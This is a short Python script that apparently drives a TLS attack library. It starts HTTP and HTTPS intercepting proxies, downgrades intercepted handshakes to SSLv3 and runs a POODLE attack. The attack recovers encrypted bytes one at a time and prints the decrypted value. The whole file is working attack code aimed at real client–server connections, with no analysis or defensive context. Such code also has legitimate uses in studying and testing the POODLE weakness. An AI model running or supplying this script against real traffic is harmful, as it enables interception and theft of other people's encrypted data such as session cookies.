import logging
import sys
import time

from tls_attack.proxy.HTTPSProxyServer import *
from tls_attack.proxy.HTTPProxyServer  import *

from tls_attack.module.ForceRequest       import *
from tls_attack.module.ForceRequestOracle import *
from tls_attack.module.PoodleAttack       import *
from tls_attack.module.AlterHandshake     import *

from tls_attack.structure import *

c_index = 0
c_key = None
c_str = ""

def poodle_result(guess, byte_index):
    global c_index, c_str

    c_str += chr(guess)
    c_index += 1

    print("Value so far : " + c_str)
    poodle_next()

def poodle_next():
    global c_index, c_key
    poodle_attack.decrypt_byte(c_key, c_index, poodle_result)

def poodle_handler(key, client_ip, server_ip):
    global c_key

    c_key = key
    poodle_next()
    

logging.basicConfig(stream=sys.stdout, level=logging.WARN)

https_server = HTTPSProxyServer(port = 8443)
http_server = HTTPProxyServer(port = 8080)
force_request = ForceRequest(http_server)

downgrade_attack = AlterHandshake(https_server)
downgrade_attack.downgrade_tls_version(TLSVersion.SSLv3)
downgrade_attack.start()

poodle_attack = PoodleAttack(https_server, force_request)
poodle_attack.on_vulnerable_connection(poodle_handler)
poodle_attack.start()